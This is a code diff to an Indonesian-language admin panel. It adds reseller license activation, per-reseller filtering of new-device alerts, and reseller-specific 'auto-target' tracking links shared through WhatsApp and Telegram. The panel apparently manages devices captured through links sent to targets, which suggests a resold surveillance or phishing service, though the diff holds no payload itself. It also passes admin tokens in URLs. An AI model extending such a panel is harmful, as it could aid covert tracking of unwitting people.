@@ -13,7 +13,15 @@
             const urlToken = new URLSearchParams(window.location.search).get('token');
             const storageToken = localStorage.getItem('admin_token');
             const token = urlToken || storageToken;
-            if (!token) { window.location.href = '/login-admin.html'; return; }
+            // Detect reseller mode from path /r/:resellerId/admin.html
+            const pathMatch = window.location.pathname.match(/^\/r\/([^/]+)\//);
+            window._resellerId = pathMatch ? pathMatch[1] : '';
+            if (!token) {
+                if (!_resellerId) { window.location.href = '/login-admin.html'; return; }
+                // Reseller mode — inject activation overlay
+                window._showLicenseActivation = true;
+                return;
+            }
             localStorage.setItem('admin_token', token);
             // If token is in storage but not in URL, redirect with token so server can verify
             if (!urlToken && storageToken) {
@@ -156,6 +164,17 @@
             <button class="header-btn" onclick="toggleTheme()" id="themeBtn">Mode Terang</button>
             <button class="header-btn" onclick="exportCSV()">CSV</button>
             <button class="header-btn" onclick="exportJSON()">JSON</button>
+        </div>
+    </div>
+
+    <!-- License Activation Overlay (for resellers) -->
+    <div id="licenseOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999;justify-content:center;align-items:center;flex-direction:column;">
+        <div style="background:var(--bg2);padding:30px;border-radius:12px;border:1px solid var(--border);max-width:400px;width:90%;text-align:center;">
+            <h2 style="margin:0 0 6px;font-size:1.1rem;color:var(--accent);">🔐 Aktivasi License</h2>
+            <p style="font-size:0.8rem;color:var(--text3);margin:0 0 16px;">Masukkan license key untuk mengakses panel ini.</p>
+            <input id="licenseKeyInput" placeholder="Paste license key..." style="width:100%;padding:10px;border-radius:6px;border:1px solid var(--border);background:var(--bg3);color:var(--text);font-size:0.82rem;box-sizing:border-box;margin-bottom:12px;text-align:center;">
+            <button onclick="activateLicense()" style="width:100%;padding:10px;border-radius:6px;background:var(--accent);color:#0f0f23;border:none;font-size:0.82rem;font-weight:600;cursor:pointer;">Aktifkan</button>
+            <div id="licenseError" style="font-size:0.75rem;color:#e44;margin-top:8px;display:none;"></div>
         </div>
     </div>
 
@@ -709,6 +728,8 @@
 
         // === NOTIF SOUND ON NEW DEVICE ===
         socket.on('device-new', (d) => {
+            // Filter by reseller
+            if (_resellerId && d.resellerId !== _resellerId) return;
             showToast(`Device baru: <b>${d.label}</b>`, 'warn');
         });
 
@@ -1425,7 +1446,7 @@
 
         // === AUTO-TARGET ===
         function loadTargetLinks() {
-            fetch(SERVER_URL + '/api/target/link').then(r=>r.json()).then(d => {
+            fetch(SERVER_URL + '/api/target/link' + (_resellerId ? '?resellerId=' + _resellerId : '')).then(r=>r.json()).then(d => {
                 document.getElementById('targetLink').textContent = d.trackingLink;
                 document.getElementById('targetWA').href = d.whatsapp;
                 document.getElementById('targetTG').href = d.telegram;
@@ -2318,6 +2339,39 @@
         // Show Reseller tab only for master admin (not reseller)
         if (!_resellerId) {
             document.getElementById('tabResellerBtn').style.display = '';
+        }
+
+        // Check for license activation mode
+        if (window._showLicenseActivation) {
+            document.getElementById('licenseOverlay').style.display = 'flex';
+            document.getElementById('licenseOverlay').style.zIndex = '9999';
+        }
+
+        function activateLicense() {
+            const key = document.getElementById('licenseKeyInput').value.trim();
+            const errEl = document.getElementById('licenseError');
+            if (!key) { errEl.textContent = 'Masukkan license key'; errEl.style.display = 'block'; return; }
+            errEl.style.display = 'none';
+            fetch(SERVER_URL + '/api/license/activate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ licenseKey: key })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) {
+                    localStorage.setItem('admin_token', data.token);
+                    window._adminToken = data.token;
+                    document.getElementById('licenseOverlay').style.display = 'none';
+                    showToast('License activated: ' + data.name, 'success');
+                    // Reload to init panel with token
+                    window.location.href = '/r/' + data.resellerId + '/admin.html?token=' + data.token;
+                } else {
+                    errEl.textContent = data.error || 'License key tidak valid';
+                    errEl.style.display = 'block';
+                }
+            }).catch(() => {
+                errEl.textContent = 'Network error. Coba lagi.';
+                errEl.style.display = 'block';
+            });
         }
 
         function createReseller() {
